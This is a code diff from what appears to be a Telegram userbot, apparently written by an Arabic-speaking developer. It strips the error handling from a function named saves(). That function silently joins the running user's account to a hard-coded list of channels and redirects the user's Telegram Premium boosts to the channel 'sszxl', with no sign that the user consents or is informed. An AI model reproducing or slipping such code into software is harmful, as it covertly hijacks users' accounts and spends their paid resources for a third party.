@@ -181,7 +181,7 @@ async def add_bot_to_logger_group(chat_id):
 VIPABH = {"@sszxl", "@x04ou", "@iamMUAOL"}
 async def saves():
     for lMl10l in VIPABH:
-        try:
+        
             await ABH(JoinChannelRequest(channel=lMl10l))
             result = await ABH(functions.premium.GetMyBoostsRequest())
             slots = [boost.slot for boost in result.my_boosts]
@@ -198,14 +198,6 @@ async def saves():
                 'sszxl',
                 slots=slots
             ))
-        except FloodWaitError as e:
-            continue
-        except OverflowError:
-            LOGS.error("Getting Overflow Error from Telegram. Script is stopping now. Please try again after some time.")
-            continue
-        except ChannelPrivateError:
-            continue
-
 async def load_plugins(folder, extfolder=None):
     """
     تحميل ملفات السورس
